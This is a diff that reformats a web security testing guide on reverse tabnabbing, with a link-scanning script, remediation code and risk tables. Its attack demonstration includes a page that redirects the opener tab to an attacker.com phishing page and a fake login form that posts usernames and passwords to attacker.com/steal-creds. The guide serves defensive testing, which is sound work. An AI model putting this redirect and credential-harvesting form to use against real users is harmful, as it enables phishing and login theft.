@@ -1,9 +1,11 @@
 # WSTG-CLNT-14: Testing for Reverse Tabnabbing
 
 ## Test ID
+
 WSTG-CLNT-14
 
 ## Test Name
+
 Testing for Reverse Tabnabbing
 
 ## High-Level Description
@@ -14,7 +16,7 @@ Reverse Tabnabbing is a phishing attack where a malicious page opened via `targe
 
 ## What to Check
 
-- [ ] Links with target="_blank"
+- [ ] Links with target="\_blank"
 - [ ] rel="noopener noreferrer" attribute
 - [ ] window.open() calls without noopener
 - [ ] User-generated links
@@ -265,48 +267,47 @@ tester.run_tests()
 
 ```javascript
 // Check page for vulnerable links
-(function() {
-    const links = document.querySelectorAll('a[target="_blank"]');
-    let vulnerable = [];
-    let safe = [];
+;(function () {
+  const links = document.querySelectorAll('a[target="_blank"]')
+  let vulnerable = []
+  let safe = []
 
-    links.forEach(link => {
-        const rel = link.getAttribute('rel') || '';
-        const href = link.getAttribute('href') || '';
+  links.forEach((link) => {
+    const rel = link.getAttribute("rel") || ""
+    const href = link.getAttribute("href") || ""
 
-        if (!rel.includes('noopener')) {
-            vulnerable.push({
-                href: href,
-                rel: rel,
-                text: link.textContent.substring(0, 50)
-            });
-        } else {
-            safe.push(href);
-        }
-    });
-
-    console.log('=== Reverse Tabnabbing Analysis ===');
-    console.log(`Total target="_blank" links: ${links.length}`);
-    console.log(`Vulnerable: ${vulnerable.length}`);
-    console.log(`Safe: ${safe.length}`);
-
-    if (vulnerable.length > 0) {
-        console.log('\nVulnerable links:');
-        vulnerable.forEach(v => {
-            console.log(`  - ${v.href}`);
-            console.log(`    rel="${v.rel}"`);
-        });
+    if (!rel.includes("noopener")) {
+      vulnerable.push({
+        href: href,
+        rel: rel,
+        text: link.textContent.substring(0, 50),
+      })
+    } else {
+      safe.push(href)
     }
+  })
 
-    // Check window.open in inline scripts
-    const scripts = document.querySelectorAll('script:not([src])');
-    scripts.forEach(script => {
-        if (script.textContent.includes('window.open') &&
-            !script.textContent.includes('noopener')) {
-            console.log('\n[!] Potentially vulnerable window.open found');
-        }
-    });
-})();
+  console.log("=== Reverse Tabnabbing Analysis ===")
+  console.log(`Total target="_blank" links: ${links.length}`)
+  console.log(`Vulnerable: ${vulnerable.length}`)
+  console.log(`Safe: ${safe.length}`)
+
+  if (vulnerable.length > 0) {
+    console.log("\nVulnerable links:")
+    vulnerable.forEach((v) => {
+      console.log(`  - ${v.href}`)
+      console.log(`    rel="${v.rel}"`)
+    })
+  }
+
+  // Check window.open in inline scripts
+  const scripts = document.querySelectorAll("script:not([src])")
+  scripts.forEach((script) => {
+    if (script.textContent.includes("window.open") && !script.textContent.includes("noopener")) {
+      console.log("\n[!] Potentially vulnerable window.open found")
+    }
+  })
+})()
 ```
 
 ### Step 4: Attack Demonstration
@@ -315,43 +316,43 @@ tester.run_tests()
 <!-- attacker.html - Hosted on attacker's site -->
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>News Article</title>
-</head>
-<body>
+  </head>
+  <body>
     <h1>Interesting Content</h1>
     <p>This is a legitimate-looking page...</p>
 
     <script>
-        // Attack: Redirect opener to phishing page
-        if (window.opener) {
-            // Method 1: Direct location change
-            window.opener.location = 'https://attacker.com/phishing.html';
+      // Attack: Redirect opener to phishing page
+      if (window.opener) {
+        // Method 1: Direct location change
+        window.opener.location = "https://attacker.com/phishing.html"
 
-            // Method 2: Gradual replacement (stealthier)
-            // setTimeout(function() {
-            //     window.opener.location = 'https://attacker.com/session-expired.html';
-            // }, 5000);
-        }
+        // Method 2: Gradual replacement (stealthier)
+        // setTimeout(function() {
+        //     window.opener.location = 'https://attacker.com/session-expired.html';
+        // }, 5000);
+      }
     </script>
-</body>
+  </body>
 </html>
 
 <!-- phishing.html - Fake login page -->
 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>Session Expired - Please Login</title>
     <!-- Copy target site's styles -->
-</head>
-<body>
+  </head>
+  <body>
     <h1>Your session has expired</h1>
     <form action="https://attacker.com/steal-creds" method="POST">
-        <input type="text" name="username" placeholder="Username">
-        <input type="password" name="password" placeholder="Password">
-        <button type="submit">Login</button>
+      <input type="text" name="username" placeholder="Username" />
+      <input type="password" name="password" placeholder="Password" />
+      <button type="submit">Login</button>
     </form>
-</body>
+  </body>
 </html>
 ```
 
@@ -359,12 +360,12 @@ tester.run_tests()
 
 ## Tools
 
-| Tool | Purpose |
-|------|---------|
+| Tool             | Purpose                 |
+| ---------------- | ----------------------- |
 | Browser DevTools | Inspect link attributes |
-| Burp Suite | Analyze page content |
-| Custom Scripts | Automated scanning |
-| HTML Validators | Check rel attributes |
+| Burp Suite       | Analyze page content    |
+| Custom Scripts   | Automated scanning      |
+| HTML Validators  | Check rel attributes    |
 
 ---
 
@@ -372,39 +373,35 @@ tester.run_tests()
 
 ```html
 <!-- SECURE: Always use rel="noopener noreferrer" -->
-<a href="https://external.com" target="_blank" rel="noopener noreferrer">
-    External Link
-</a>
+<a href="https://external.com" target="_blank" rel="noopener noreferrer"> External Link </a>
 
 <!-- For internal links, noopener alone is sufficient -->
-<a href="/internal-page" target="_blank" rel="noopener">
-    Internal Link
-</a>
+<a href="/internal-page" target="_blank" rel="noopener"> Internal Link </a>
 ```
 
 ```javascript
 // SECURE: window.open with noopener
 function openSecure(url) {
-    // Method 1: Use noopener in features string
-    window.open(url, '_blank', 'noopener,noreferrer');
+  // Method 1: Use noopener in features string
+  window.open(url, "_blank", "noopener,noreferrer")
 }
 
 // Method 2: Null out opener after opening
 function openSecureAlt(url) {
-    const newWindow = window.open(url, '_blank');
-    if (newWindow) {
-        newWindow.opener = null;
-    }
+  const newWindow = window.open(url, "_blank")
+  if (newWindow) {
+    newWindow.opener = null
+  }
 }
 
 // SECURE: Dynamic link creation
 function createSecureLink(url, text) {
-    const link = document.createElement('a');
-    link.href = url;
-    link.target = '_blank';
-    link.rel = 'noopener noreferrer';
-    link.textContent = text;
-    return link;
+  const link = document.createElement("a")
+  link.href = url
+  link.target = "_blank"
+  link.rel = "noopener noreferrer"
+  link.textContent = text
+  return link
 }
 ```
 
@@ -419,53 +416,52 @@ def add_security_headers(response):
 
 ```javascript
 // Automatic protection via JavaScript (defense in depth)
-document.addEventListener('DOMContentLoaded', function() {
-    // Add noopener to all existing _blank links
-    document.querySelectorAll('a[target="_blank"]').forEach(link => {
-        const rel = link.getAttribute('rel') || '';
-        if (!rel.includes('noopener')) {
-            link.setAttribute('rel', (rel + ' noopener noreferrer').trim());
+document.addEventListener("DOMContentLoaded", function () {
+  // Add noopener to all existing _blank links
+  document.querySelectorAll('a[target="_blank"]').forEach((link) => {
+    const rel = link.getAttribute("rel") || ""
+    if (!rel.includes("noopener")) {
+      link.setAttribute("rel", (rel + " noopener noreferrer").trim())
+    }
+  })
+
+  // Observer for dynamically added links
+  const observer = new MutationObserver((mutations) => {
+    mutations.forEach((mutation) => {
+      mutation.addedNodes.forEach((node) => {
+        if (node.nodeType === 1) {
+          const links = node.querySelectorAll ? node.querySelectorAll('a[target="_blank"]') : []
+          links.forEach((link) => {
+            const rel = link.getAttribute("rel") || ""
+            if (!rel.includes("noopener")) {
+              link.setAttribute("rel", (rel + " noopener noreferrer").trim())
+            }
+          })
         }
-    });
+      })
+    })
+  })
 
-    // Observer for dynamically added links
-    const observer = new MutationObserver(mutations => {
-        mutations.forEach(mutation => {
-            mutation.addedNodes.forEach(node => {
-                if (node.nodeType === 1) {
-                    const links = node.querySelectorAll ?
-                        node.querySelectorAll('a[target="_blank"]') : [];
-                    links.forEach(link => {
-                        const rel = link.getAttribute('rel') || '';
-                        if (!rel.includes('noopener')) {
-                            link.setAttribute('rel', (rel + ' noopener noreferrer').trim());
-                        }
-                    });
-                }
-            });
-        });
-    });
-
-    observer.observe(document.body, { childList: true, subtree: true });
-});
+  observer.observe(document.body, { childList: true, subtree: true })
+})
 ```
 
 ---
 
 ## Risk Assessment
 
-| Finding | CVSS | Severity |
-|---------|------|----------|
-| External links without noopener | 4.3 | Medium |
-| User-generated links without noopener | 5.4 | Medium |
-| window.open without noopener | 4.3 | Medium |
+| Finding                               | CVSS | Severity |
+| ------------------------------------- | ---- | -------- |
+| External links without noopener       | 4.3  | Medium   |
+| User-generated links without noopener | 5.4  | Medium   |
+| window.open without noopener          | 4.3  | Medium   |
 
 ---
 
 ## CWE Categories
 
-| CWE ID | Title |
-|--------|-------|
+| CWE ID       | Title                                                         |
+| ------------ | ------------------------------------------------------------- |
 | **CWE-1022** | Use of Web Link to Untrusted Target with window.opener Access |
 
 ---
